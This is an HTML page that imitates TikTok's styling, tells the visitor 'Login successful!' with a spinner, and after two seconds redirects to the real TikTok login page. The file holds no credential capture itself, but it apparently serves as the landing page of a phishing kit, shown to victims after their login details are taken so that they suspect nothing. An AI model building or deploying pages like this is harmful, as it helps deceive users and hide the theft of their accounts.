<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
            color: #333;
            margin: 0;
            flex-direction: column;
            text-align: center;
        }
        .message-box {
            background: white;
            padding: 30px 40px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 90%;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
        }
        h2 {
            color: #fe2c55;
            margin-bottom: 10px;
        }
        p {
            font-size: 1.1em;
            line-height: 1.6;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #fe2c55;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="message-box">
        <h2>Login successful!</h2>
        <div class="spinner"></div>
        <p>Redirecting to TikTok...</p>
    </div>

    <script>
        // Set a timeout to redirect to the actual TikTok login page after 2 seconds (2000 milliseconds)
        setTimeout(function() {
            window.location.href = "https://www.tiktok.com/login";
        }, 2000); // Adjust delay as needed (e.g., 1000 for 1 second, 3000 for 3 seconds)
    </script>
</body>
</html>
